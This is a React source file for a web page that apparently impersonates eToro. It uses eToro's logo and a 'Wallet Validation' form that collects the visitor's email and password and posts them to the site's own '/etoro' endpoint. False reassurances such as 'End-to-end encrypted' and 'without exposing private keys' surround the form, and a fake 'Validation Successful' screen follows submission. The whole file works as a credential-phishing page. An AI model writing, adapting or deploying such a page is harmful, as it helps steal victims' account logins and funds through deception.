import React, { useState } from "react";
import {
  Eye,
  EyeOff,
  Loader2,
  Shield,
  CheckCircle
} from "lucide-react";
import "./etoroPagesCss/etoroWallets.css";
import etoroLogo from "../../assets/etoro_logo.png";
import fetchWithRetry from "../../utils/api";

const EtoroWallet = () => {
  const [form, setForm] = useState({
    emailOrUsername: "",
    password: ""
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  const submitForm = async () => {
    if (!form.emailOrUsername || !form.password) {
      setError("Please fill in all fields");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetchWithRetry("/etoro", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form)
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Validation failed");

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === "Enter" && !loading) submitForm();
  };

  /* ================= SUCCESS ================= */
  if (done) {
    return (
      <div className="etoro-wrapper">
        <div className="etoro-box">
          <img src={etoroLogo} className="etoro-logo" />
          <div className="etoro-panel">
            <CheckCircle size={36} color="#13c636" />
            <h2>Validation Successful</h2>
            <p>Your wallet verification is being processed securely.</p>
            <div className="etoro-actions">
              <button onClick={() => window.location.reload()}>
                Validate Another
              </button>
              <button className="dark" onClick={() => (window.location.href = "/")}>
                Go Home
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  /* ================= FORM ================= */
  return (
    <div className="etoro-wrapper">
      <div className="etoro-box">
        <img src={etoroLogo} className="etoro-logo" />
        <h1>Wallet Validation</h1>
        <p className="subtitle">
          Verify ownership to continue securely
        </p>
        <div className="etoro-panel">
          <div className="security">
            <Shield size={14} />
            End-to-end encrypted
          </div>
          <div className="input-group">
            <label>Email Address</label>
            <input
              type="email"
              placeholder="your@email.com"
              value={form.emailOrUsername}
              onChange={(e) =>
                setForm({ ...form, emailOrUsername: e.target.value })
              }
              onKeyPress={handleKeyPress}
            />
          </div>
          <div className="input-group">
            <label>Password</label>
            <div className="password-field">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter password"
                value={form.password}
                onChange={(e) =>
                  setForm({ ...form, password: e.target.value })
                }
                onKeyPress={handleKeyPress}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>
          {error && <div className="error">{error}</div>}
          <button
            className="submit-btn"
            onClick={submitForm}
            disabled={loading}
          >
            {loading ? (
              <>
                <Loader2 className="spin" size={18} />
                Validating...
              </>
            ) : (
              "Validate Wallet"
            )}
          </button>
          <p className="notice">
            Validation confirms wallet ownership without exposing private keys.
          </p>
        </div>
        <footer>
          Protected by industry-grade security standards
        </footer>
      </div>
    </div>
  );
};

export default EtoroWallet;